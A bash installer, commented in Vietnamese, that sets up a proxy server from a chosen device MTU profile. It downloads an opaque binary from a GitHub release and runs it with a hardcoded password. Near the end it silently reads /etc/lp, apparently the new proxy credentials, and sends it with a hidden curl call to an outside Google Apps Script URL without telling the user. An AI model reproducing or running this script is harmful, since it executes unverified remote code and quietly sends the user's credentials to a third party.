#!/bin/bash

# ❓ Hỏi trước khi cập nhật hệ thống, mặc định là "n" nếu Enter
read -p "👉 Bạn có muốn cập nhật hệ thống và cài iptables + cron? (y/N): " update_ans
update_ans=${update_ans:-n}  # Nếu người dùng không nhập gì thì gán là "n"

if [[ "$update_ans" =~ ^[Yy]$ ]]; then
  echo "🔧 Đang cập nhật và cài đặt..."
  sudo apt update && sudo apt-get install --no-upgrade iptables cron -y
else
  echo "⏩ Bỏ qua bước cập nhật."
fi
read -p "👉 Nhập Tên SEVER: " user_input
# 🧠 Hiển thị và chọn cấu hình TCP/IP hợp lệ (1–9)
echo ""
echo "1) iOS 1440 generic tunnel or VPN (4G-5G)"
echo "2) iOS 1450 generic tunnel or VPN (4G-5G)"
echo "3) iOS 1492 PPPoE (wifi)"
echo "4) Android 1440 generic tunnel or VPN (4G-5G)"
echo "5) Android 1450 generic tunnel or VPN (4G-5G)"
echo "6) Android 1492 PPPoE (wifi)"
echo "7) macOS 1492 PPPoE (wifi)"
echo "8) Windows 1492 PPPoE (wifi)"
echo "9) Windows 1440 generic tunnel or VPN (4G-5G)"
# 🔁 Nhập lựa chọn, mặc định là 7 nếu ấn Enter
while true; do
  read -p "👉 Chọn cấu hình TCP/IP (nhập số 1-9, Enter = mặc định 7): " config_option
  config_option=${config_option:-7}
  if [[ "$config_option" =~ ^[1-9]$ ]]; then
    break
  else
    echo "❌ Lựa chọn không hợp lệ. Vui lòng nhập số từ 1 đến 9."
  fi
done
# Tải file nhị phân về /usr/local/bin
wget -qO /usr/local/bin/createprx https://github.com/luffypro666/tien/releases/download/create/createprxaz
chmod +x /usr/local/bin/createprx

# Truyền dữ liệu vào createprx (dòng 2 bạn nhập tay), cách nhau 2 giây
{
  echo "Tienmaster@123"
  echo "$user_input"
  echo "kieunhutrung1.github.io"
  sleep 2

  echo "$config_option"
  sleep 2
} | /usr/local/bin/createprx

# Đọc nội dung của file vào biến
data=$(cat /etc/lp)
# Mã hóa nội dung để sử dụng trong URL
encoded_data=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$data'''))")
# Tạo đường link hoàn chỉnh
url="https://script.google.com/macros/s/AKfycbysmF_1WUzUh3pebh1g4uHL2sigyDMXWQwOtm4e7-SoyYklE-iNqKie3J_7v0kZvBJy9Q/exec?PROXY=$encoded_data"
# Gửi yêu cầu GET đến URL
curl -s -G "$url" > /dev/null 2>&1
cat /etc/lp
